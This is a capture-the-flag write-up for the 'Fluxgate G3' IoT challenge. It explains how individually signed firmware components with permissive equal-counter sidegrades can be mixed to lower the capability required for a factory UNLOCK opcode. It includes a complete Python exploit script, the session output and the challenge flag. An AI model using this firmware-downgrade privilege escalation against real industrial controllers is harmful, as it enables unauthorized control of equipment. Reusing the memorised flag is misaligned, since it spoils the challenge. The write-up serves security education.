---
title: "Fluxgate G3 — Factory Service Mode Bypass"
description: "A small industrial controller exposes a line-oriented ASCII maintenance service over TCP. Factory service mode is supposed to be reachable only by on-site technicians with a dedicated…"
event: "isfcr"
category: "iot"
categoryLabel: "IoT"
tags: ["ISFCR CTF 2026","iot"]
date: "2026-10-10"
teammate: false
source: "isfcr/writeups/fluxgate-g3.md"
---

**Category:** IoT / Firmware / Protocol reversing
**Flag:** `isfcr{s1gn3d_p4rts_uns1gn3d_whole_ab84f1}`

## Overview

A small industrial controller exposes a line-oriented ASCII maintenance service
over TCP. Factory service mode is supposed to be reachable only by on-site
technicians with a dedicated hardware token. We are given the vendor's firmware
bundle (`fluxgate-g3.zip`) and a low-tier operator token (capabilities
`0x0003`). The goal is to reach the `UNLOCK` action (factory service mode) and
fetch the flag.

## Reconnaissance

`fluxgate-g3.zip` contains:

- `docs/protocol.md` — command reference, frame layout, operator token format
- `docs/artifact.md` — binary layout of the vendor "FXG1" firmware artifacts
- `tools/client.py` — a helper TCP client
- `artifacts/*.fw` — signed firmware blobs for three components:
  - `pol` — policy / handler table
  - `tab` — opcode → capability-bitmap translation table
  - `rad` — radio / framing parameters

Connecting to the service and probing:

```
OK Fluxgate G3 (sim)
OK vendor_pk=ebe00b4ae4c749b45f9ffa3d4956c20b30f6e9b67572427b9a0d6fb44c502f9c
OK booted=False
OK   pol: v3 counter=3 build=0x0303 deps=[tab:v2-v2, rad:v2-v2]
OK   tab: v2 counter=2 build=0x1002 deps=[none]
OK   rad: v2 counter=2 build=0x2002 deps=[none]
OK token_b64=ACoAA8DeEzdvSf/+TnMNc/myF8hIv5cl
```

The issued token decodes to the documented structure (24 bytes):

```
user_id=0x002a (42)   capabilities=0x0003   nonce=...   hmac=...
```

So we only hold `BASIC_READ | STATUS`.

## Analyzing the firmware artifacts

Parsing the FXG1 containers (`magic "FXG1"`, component, version, security
counter, build id, dependencies, payload_len, payload, Ed25519 signature) gives:

`pol-*.fw` payloads (handler table):

| artifact     | version/build | handlers (opcode → action)                    |
|--------------|---------------|-----------------------------------------------|
| pol-v1       | 1 / 0x0101    | 0x10→02, 0x20→01, 0x30→03, 0x40→04           |
| pol-v2       | 2 / 0x0202    | + 0x50→05                                     |
| pol-v3       | 3 / 0x0303    | + 0x60→06                                     |
| pol-v3rc     | 3 / 0x03c1    | + **0x70→07 (UNLOCK)**                        |

`tab-*.fw` payloads (opcode → required capability mask):

| artifact     | version | interesting entry                            |
|--------------|---------|----------------------------------------------|
| tab-v1       | 1       | 0x10..0x40                                   |
| tab-v2       | 2       | ... 0x70 → **0x8000 (SERVICE)**              |
| tab-v3       | 3       | ... **0x70 → 0x0001 (BASIC_READ)** ← bug     |

`rad-*.fw` payloads:

| artifact | version | frame_version |
|----------|---------|---------------|
| rad-v1   | 1       | 1             |
| rad-v2   | 2       | 2             |

Key facts:

- Action `0x07` (`UNLOCK`) emits the *factory service blob* once the handler is
  invoked (per `docs/artifact.md`).
- In the default build (`tab-v2`) opcode `0x70` requires the `SERVICE`
  capability bit `0x8000`, which our low-tier token does **not** have.
- `pol-v3rc` ships the `0x70 → UNLOCK` handler, and `tab-v3` declares opcode
  `0x70` as requiring only `BASIC_READ` (`0x0001`).

## The vulnerability

Update acceptance logic (from `docs/protocol.md`):

1. artifact vendor signature must verify
2. security counter must be **≥** the stored counter (equal counters are
   permitted, for "sidegrades")
3. after the proposed install, **every** installed component's declared
   dependency ranges must be satisfied

The component *payloads* are signed (individually) and counter-checked, but the
whole *installed set* is only validated pairwise at `BOOT` time via dependency
ranges. Nothing prevents mixing:

- `pol-v3rc` (v3, counter 3 — equal to the stored `pol` v3 counter, so a
  sidegrade from `0x0303` to `0x03c1` is allowed) depends on `tab:v1-v3` and
  `rad:v1-v2`;
- `tab-v3` (v3, counter 3 ≥ stored 2) depends on `pol:v3-v3`;
- `rad-v2` stays, frame_version 2.

This combination is fully dependency-satisfying, but it replaces the
high-privilege `0x70` service entry (`tab-v2`: `SERVICE`) with the
low-privilege `0x70` entry (`tab-v3`: `BASIC_READ`). Combined with `pol-v3rc`
providing the `UNLOCK` handler for that same opcode, the factory service trapdoor
becomes reachable with our `0x0003` token.

## Exploit session

Download the `tab-v3.fw` and `pol-v3rc.fw` blobs, sidegrade them in, boot, grab
a fresh token, and craft the frame.

```python
import socket, base64, struct, time

HOST, PORT = "0.cloud.chals.io", 25537
ART = "artifacts/"
s = socket.create_connection((HOST, PORT))
s.settimeout(1.0)

def rd():
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
    except socket.timeout: pass
    return buf

def cmd(line):
    s.sendall((line + "\n").encode()); time.sleep(0.5); return rd()

def b64file(name):
    return base64.b64encode(open(ART + name, "rb").read()).decode()

# 1. sidegrade pol -> pol-v3rc  (equal counter 3, adds 0x70 -> UNLOCK)
print(cmd("UPDATE " + b64file("pol-v3rc.fw")).decode(errors="replace"))
# 2. upgrade tab -> tab-v3     (counter 3 >= 2, rewrites 0x70 mask to BASIC_READ)
print(cmd("UPDATE " + b64file("tab-v3.fw")).decode(errors="replace"))
print(cmd("STATUS").decode(errors="replace"))
# 3. boot the new installed set
print(cmd("BOOT").decode(errors="replace"))
# 4. grab the issued operator token
tok_b64 = cmd("TOKEN").decode().split("token_b64=")[1].split()[0]
tok = base64.b64decode(tok_b64)

# 5. frame: magic "FG", frame_version=2 (rad-v2), opcode 0x70, len=0, token
frame = b"FG" + bytes([2, 0x70, 0x00]) + tok
print(cmd("SEND " + base64.b64encode(frame).decode()).decode(errors="replace"))
```

Session output:

```
OK installed pol@v3 (counter=3, build=0x03c1)
OK installed tab@v3 (counter=3, build=0x1003)
OK   pol: v3 counter=3 build=0x03c1 deps=[tab:v1-v3, rad:v1-v2]
OK   tab: v3 counter=3 build=0x1003 deps=[pol:v3-v3]
OK   rad: v2 counter=2 build=0x2002 deps=[none]
OK boot ok: pol@v3.03c1 tab@v3.1003 rad@v2.2002
OK resp_b64=dW5sb2NrOmlzZmNye3MxZ24zZF9wNHJ0c191bnMxZ24zZF93aG9sZV9hYjg0ZjF9
```

Decoding the response payload:

```
$ echo dW5sb2NrOmlzZmNye3MxZ24zZF9wNHJ0c191bnMxZ24zZF93aG9sZV9hYjg0ZjF9 | base64 -d
unlock:isfcr{s1gn3d_p4rts_uns1gn3d_whole_ab84f1}
```

## Flag

```
isfcr{s1gn3d_p4rts_uns1gn3d_whole_ab84f1}
```

The flag name hints at the core flaw: the vendor signs and counter-checks the
individual `pol`/`tab`/`rad` artifacts, but the trust boundary ends at the
artifact, not at the *installed component set*. An attacker who can pick signed
"RC" / variant builds can reassemble a fully "signed" boot set whose permissions
are weaker than the vendor intended.
